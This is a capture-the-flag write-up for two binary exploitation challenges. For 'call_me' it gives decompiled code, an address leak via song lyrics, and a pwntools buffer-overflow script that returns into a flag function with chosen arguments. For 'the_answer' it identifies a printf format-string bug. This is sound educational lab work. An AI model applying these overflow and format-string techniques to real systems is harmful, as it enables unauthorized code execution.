# call_me

```
As the name suggests, you should probably call some function (with the correct arguments) to make the service print a flag. Are there any other flags? Maybe...
```
  k
In order to understand what the executable would normally do I tried to run it and when prompted I inserted random values.
Doing so I finally got this message outputted

```
Wow, you do know the song! However, you did not solve the challenge :-(
```

Reading this I thought that maybe some pattern matching was executed against the input looking for a specific song's lyrics.
Leveraging this I opened the file with Ghidra looking for something related.
Analysing the functions I found one with an interesting body

```c
void FUN_000111ed(int param_1,int param_2,int param_3)
{
	printf("BASC{");
	if (param_1 != 0xb100d) {
	    exit(1);
	}
	printf("you_g0t_");
	if (param_2 != 0x5e1ec7ed) {
	    exit(2);
	}
	printf("the_args_");
	if (param_3 != 0x7ea) {
        exit(3);
	}
	puts("right}.");
        exit(0x2a);
	}
}
```

This functions seemed to print a flag if some specific parameters where passed.
To better understand what was going on I used the functionality to show the functions' calls tree.
Doing so I discovered that the "print_flag" function was called by another one 

```c
void FUN_000112f8(void)
{
	char *pcVar1;
	int iVar2;
	char acStack_bd [165];
	size_t local_18;
	int local_14;
	int local_10;
  
	local_10 = 0;
	local_14 = 0;
	while( true ) {
	    if ((&PTR_s_Color_me_your_color,_baby_00014020)[local_14] == (undefined *)0x0) {
			puts("Wow, you do know the song! However, you did not solve the challenge :-(");
			return;
	    }
	    printf("Enter line #%d: ",local_14 + 1);
	    pcVar1 = gets(acStack_bd + 1);
	    if (pcVar1 == (char *)0x0) break;
	    local_18 = strlen(acStack_bd + 1);
	    if (0x50 < local_18) {
	      return;
	    }
	    if ((local_18 != 0) && (acStack_bd[local_18] == '\n')) {
	      acStack_bd[local_18] = '\0';
	    }
	    iVar2 = strcmp(acStack_bd + 1,(&PTR_s_Color_me_your_color,_baby_00014020)[local_14]);
	    if (iVar2 == 0) {
	      local_10 = local_10 + 1;
	      if (local_10 == 3) {
	        printf("&target=%p\n",print_flag);
	      }
	    }
	    else {
	      local_10 = local_10 + -1;
	    }
	    local_14 = local_14 + 1;
	  }
  return;
}
```

This function was actually the one that prompted the user to insert the song's lyrics and looking at the line 

```c
printf("Enter line #%d: ",local_14 + 1);
```

I understood that the variable **local_14** held a index that kept track the current song's lyrics line that would be later on compared with the one inserted by the user

```c
iVar2 = strcmp(acStack_bd + 1,(&PTR_s_Color_me_your_color,_baby_00014020)[local_14]);
```

If the comparison was successful the variable **local_10** would be incremented and when the value 3 was reached it should leak the address of the **print_flag** function.
So in order to get the address I had to insert three correct lines of the song's lyrics

```
> nc 192.168.20.1 5110
Enter line #1: Color me your color, baby
Enter line #2: Color me your car
Enter line #3: Color me your color, darling
&target=0x5664a1ed
```

Knowing this I could finally exploit the program through the **gets** function vulnerability.

```c
pcVar1 = gets(acStack_bd + 1);
```

It is possible to conduct a buffer overflow attack pretty easily figuring out the offset necessary to fill the **acStack_bd** variable ( e.g. using a cyclic pattern ) and then returning to the dynamically leaked function's address.
I had also to pass the correct parameters leaked by the **print_flag** function in order to get the flag.
Adding a 4 bytes offset between the function address and the parameters was necessary due to the architecture calling convention.

```python
p = pwn.remote(HOST, PORT)
p.recvuntil(b":")
p.sendline(b"Color me your color, baby")
p.recvuntil(b":")
p.sendline(b"Color me your car")
p.recvuntil(b":")
p.sendline(b"Color me your color, darling")
leaked_address = p.recvuntil(b"target=")
leaked_address = p.recvline().strip().decode()
p.sendline(
	b"a" * OFFSET
	+ pwn.p32(int(leaked_address, 16))
	+ b"a" * 4
	+ pwn.p32(int(FIRST_PARAM, 16))
	+ pwn.p32(int(SECOND_PARAM, 16))
	+ pwn.p32(int(THIRD_PARAM, 16))
)
p.interactive()
```

Doing so I was able to get the first flag

```
BASC{you_g0t_the_args_right}
```

Since the exercise description hinted the presence of other flags I tried to gather more info about the file security using the **checksec** command

```json
{
	"call_me_thaMilo": 
	{
	    "relro": "full",
	    "canary": "no",
	    "nx": "yes",
	    "pie": "yes",
	    "rpath": "no",
	    "runpath": "no",
	    "symbols": "no",
	    "fortify_source": "no",
	    "fortified": "0",
	    "fortify-able": "2"
	}
}
```

Since **nx** is enabled is impossible to execute shell-codes and considering all the other security measures the only vulnerability I could find was trying to conduct a ret-to-libc attack.

# the_answer

```
There is a unique answer to the Ultimate Question of Life, the Universe, and Everything.
BTW, `0xbadc0ffe` isn'it.

Warning: Ghidra's decompiler sometimes (it depends on the Ghidra version) tries too hard to be clever and may "optimize" (=hide/remove) something it shouldn't.
So, do not blindly trust its output and take a look at the assembly view as well.
```

In order to understand what the executable would normally do I tried to run it and when prompted I inserted a my name since it asked for it.
It replied only with "Hi, Milo".
So I had to check what was going on inside with Ghidra.

```c
undefined8 main(void)
{
  int __fd;
  ssize_t sVar1;
  size_t __n;
  long in_FS_OFFSET;
  char local_1018 [4104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  memset(local_1018,0,0x1000);
  puts("What\'s your name?");
  sVar1 = read(0,local_1018,0x1000);
  if (sVar1 < 1) {
    exit(1);
  }
  printf("Hi, ");
  printf(local_1018);
  if (DAT_00404308 == 0x2a) {
    puts("Exactly! Here\'s your flag:");
    __fd = open("flag.txt",0);
    __n = read(__fd,local_1018,0x1000);
    write(1,local_1018,__n);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

With a quick look I saw that if the variable **DAT_00404308** was equal to 0x2a, 42 decimal ( \*Galaxy Hitchhiker nodding\* ) the **flag.txt** file was read and printed out... so the focus was getting that variable to hold the correct value.
